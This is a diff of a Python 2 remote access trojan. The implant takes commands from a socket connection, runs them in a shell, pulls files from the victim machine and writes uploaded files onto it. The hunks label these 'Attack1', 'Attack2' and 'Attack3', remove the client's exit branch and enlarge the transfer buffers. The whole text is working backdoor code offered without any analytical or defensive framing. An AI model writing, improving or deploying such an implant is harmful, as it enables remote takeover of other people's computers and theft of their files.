@@ -24,6 +24,7 @@ except socket.error, e:
 	errorcode=e[1]
 	print errorcode
 
+# Attack1 loop to run commands on target
 while 1:
 	action = client.recv(256)
 	if action == "1":
@@ -32,16 +33,13 @@ while 1:
 				commandToRun = client.recv(4096)
 				if commandToRun != "":
 					try:
-						output = subprocess.check_output(commandToRun, stderr=subprocess.PIPE, shell=True)
+						output = subprocess.check_output(commandToRun, stderr=subprocess.STDOUT, shell=True)
 						client.sendall(output)
 					except subprocess.CalledProcessError as errorCmd:
 						client.sendall(errorCmd.output)
-				else:
-					client.close()
-					sys.exit()
 			except KeyboardInterrupt:
 				pass
-
+	# Attack2 processing to download files from target
 	if action == "2":
 		try:
 			waitingFilename = "Enter the filename to download from the target : "
@@ -71,7 +69,7 @@ while 1:
 		except socket.error, e:
 			errorcode=e[1]
 			print errorcode
-
+	#attack3 processing to upload files on target
 	if action == "3":
 		try:
 			waitingFilename = "Enter the filename to transfer on the target : "
@@ -85,7 +83,7 @@ while 1:
 				client.sendall(known)
 				confirm = client.recv(256)
 				if confirm == "1":
-					clientFiledata = client.recv(4096)
+					clientFiledata = client.recv(40000)
 					uploadedFile = open(Filename, "wb")
 					# importing data in the new file
 					uploadedFile.write(clientFiledata)
@@ -98,7 +96,7 @@ while 1:
 			if not os.path.exists(cwd+"/"+Filename):
 				known = "0"
 				client.sendall(known)
-				clientFiledata = client.recv(4096)
+				clientFiledata = client.recv(40000)
 				uploadedFile = open(Filename, "wb")
 				# importing data in the new file
 				uploadedFile.write(clientFiledata)
